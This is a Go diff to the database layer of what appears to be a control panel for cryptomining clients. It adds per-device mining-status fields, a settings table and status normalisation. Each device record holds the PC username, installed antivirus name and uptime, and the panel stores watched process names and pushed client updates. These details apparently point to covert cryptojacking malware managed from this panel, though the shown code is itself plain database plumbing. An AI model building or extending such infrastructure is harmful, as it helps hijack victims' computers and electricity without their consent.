@@ -6,6 +6,7 @@ import (
 	"database/sql"
 	"errors"
 	"fmt"
+	"strings"
 	"time"
 
 	"github.com/jackc/pgx/v5"
@@ -97,9 +98,12 @@ func (db *DB) createTables() error {
 		pc_username TEXT NOT NULL,
 		cpu_name TEXT,
 		gpu_name TEXT,
+		mining_status TEXT DEFAULT 'unknown',
+		cpu_mining_status TEXT DEFAULT 'unknown',
+		gpu_mining_status TEXT DEFAULT 'unknown',
 		antivirus_name TEXT,
 		device_uptime_min INTEGER DEFAULT 0,
-		client_version TEXT DEFAULT '2.3.0',
+		client_version TEXT DEFAULT '3.3',
 		status TEXT DEFAULT 'online',
 		last_seen INTEGER,
 		created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
@@ -125,6 +129,13 @@ func (db *DB) createTables() error {
 		created_at INTEGER NOT NULL
 	);`
 
+	settingsTable := `
+	CREATE TABLE IF NOT EXISTS panel_settings (
+		key TEXT PRIMARY KEY,
+		value TEXT NOT NULL,
+		updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+	);`
+
 	updatesTable := `
 	CREATE TABLE IF NOT EXISTS updates (
 		id BIGSERIAL PRIMARY KEY,
@@ -134,7 +145,7 @@ func (db *DB) createTables() error {
 		uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 	);`
 
-	for _, schema := range []string{minersTable, configTable, usersTable, updatesTable} {
+	for _, schema := range []string{minersTable, configTable, usersTable, updatesTable, settingsTable} {
 		if _, err := db.Exec(schema); err != nil {
 			return fmt.Errorf("failed to execute schema: %w", err)
 		}
@@ -142,9 +153,12 @@ func (db *DB) createTables() error {
 
 	migrations := []string{
 		`ALTER TABLE config ADD COLUMN IF NOT EXISTS watched_processes TEXT DEFAULT ''`,
-		`ALTER TABLE miners ADD COLUMN IF NOT EXISTS client_version TEXT DEFAULT '2.3.0'`,
+		`ALTER TABLE miners ADD COLUMN IF NOT EXISTS client_version TEXT DEFAULT '3.3'`,
 		`ALTER TABLE miners DROP COLUMN IF EXISTS cpu_hashrate`,
 		`ALTER TABLE miners DROP COLUMN IF EXISTS gpu_hashrate`,
+		`ALTER TABLE miners ADD COLUMN IF NOT EXISTS mining_status TEXT DEFAULT 'unknown'`,
+		`ALTER TABLE miners ADD COLUMN IF NOT EXISTS cpu_mining_status TEXT DEFAULT 'unknown'`,
+		`ALTER TABLE miners ADD COLUMN IF NOT EXISTS gpu_mining_status TEXT DEFAULT 'unknown'`,
 	}
 	for _, migration := range migrations {
 		if _, err := db.Exec(migration); err != nil {
@@ -173,10 +187,51 @@ func (db *DB) createTables() error {
 	return nil
 }
 
+// GetSetting returns the stored value for key, or "" when it does not exist.
+func (db *DB) GetSetting(key string) (string, error) {
+	var value string
+	err := db.QueryRow("SELECT value FROM panel_settings WHERE key = $1", key).Scan(&value)
+	if err == sql.ErrNoRows {
+		return "", nil
+	}
+	if err != nil {
+		return "", err
+	}
+	return value, nil
+}
+
+// SetSetting inserts or replaces a setting.
+func (db *DB) SetSetting(key, value string) error {
+	_, err := db.Exec(`
+		INSERT INTO panel_settings (key, value, updated_at)
+		VALUES ($1, $2, $3)
+		ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at
+	`, key, value, time.Now())
+	return err
+}
+
+// MiningStates lists the values accepted for a miner's reported state.
+var MiningStates = []string{"active", "paused", "error", "disabled", "unknown"}
+
+// NormalizeMiningStatus maps a client-reported state onto a known value so the
+// dashboard never renders arbitrary text from a client.
+func NormalizeMiningStatus(status string) string {
+	normalized := strings.ToLower(strings.TrimSpace(status))
+	for _, known := range MiningStates {
+		if normalized == known {
+			return known
+		}
+	}
+	return "unknown"
+}
+
 // GetMiners retrieves all miners
 func (db *DB) GetMiners() ([]models.Miner, error) {
 	rows, err := db.Query(`
 		SELECT id, device_hash, pc_username, cpu_name, gpu_name,
+			COALESCE(mining_status, 'unknown'),
+			COALESCE(cpu_mining_status, 'unknown'),
+			COALESCE(gpu_mining_status, 'unknown'),
 			antivirus_name, device_uptime_min, client_version, status, last_seen, created_at
 		FROM miners
 		ORDER BY last_seen DESC
@@ -190,7 +245,7 @@ func (db *DB) GetMiners() ([]models.Miner, error) {
 	for rows.Next() {
 		var m models.Miner
 		var createdAt time.Time
-		if err := rows.Scan(&m.ID, &m.DeviceHash, &m.PCUsername, &m.CPUName, &m.GPUName, &m.AntivirusName, &m.DeviceUptimeMin, &m.ClientVersion, &m.Status, &m.LastSeen, &createdAt); err != nil {
+		if err := rows.Scan(&m.ID, &m.DeviceHash, &m.PCUsername, &m.CPUName, &m.GPUName, &m.MiningStatus, &m.CPUMiningStatus, &m.GPUMiningStatus, &m.AntivirusName, &m.DeviceUptimeMin, &m.ClientVersion, &m.Status, &m.LastSeen, &createdAt); err != nil {
 			return nil, err
 		}
 		m.CreatedAt = createdAt.Unix()
@@ -203,18 +258,23 @@ func (db *DB) GetMiners() ([]models.Miner, error) {
 // UpsertMiner inserts or updates a miner by device_hash
 func (db *DB) UpsertMiner(report *models.MinerReport) error {
 	_, err := db.Exec(`
-		INSERT INTO miners (device_hash, pc_username, cpu_name, gpu_name, antivirus_name, device_uptime_min, client_version, status, last_seen)
-		VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
+		INSERT INTO miners (device_hash, pc_username, cpu_name, gpu_name, mining_status, cpu_mining_status, gpu_mining_status, antivirus_name, device_uptime_min, client_version, status, last_seen)
+		VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)
 		ON CONFLICT(device_hash) DO UPDATE SET
 			pc_username = excluded.pc_username,
 			cpu_name = excluded.cpu_name,
 			gpu_name = excluded.gpu_name,
+			mining_status = excluded.mining_status,
+			cpu_mining_status = excluded.cpu_mining_status,
+			gpu_mining_status = excluded.gpu_mining_status,
 			antivirus_name = excluded.antivirus_name,
 			device_uptime_min = excluded.device_uptime_min,
 			client_version = excluded.client_version,
 			status = 'online',
 			last_seen = excluded.last_seen
-	`, report.DeviceHash, report.PCUsername, report.CPUName, report.GPUName, report.AntivirusName, report.DeviceUptimeMin, report.ClientVersion, "online", report.Timestamp)
+	`, report.DeviceHash, report.PCUsername, report.CPUName, report.GPUName,
+		NormalizeMiningStatus(report.MiningStatus), NormalizeMiningStatus(report.CPUMiningStatus), NormalizeMiningStatus(report.GPUMiningStatus),
+		report.AntivirusName, report.DeviceUptimeMin, report.ClientVersion, "online", report.Timestamp)
 
 	return err
 }
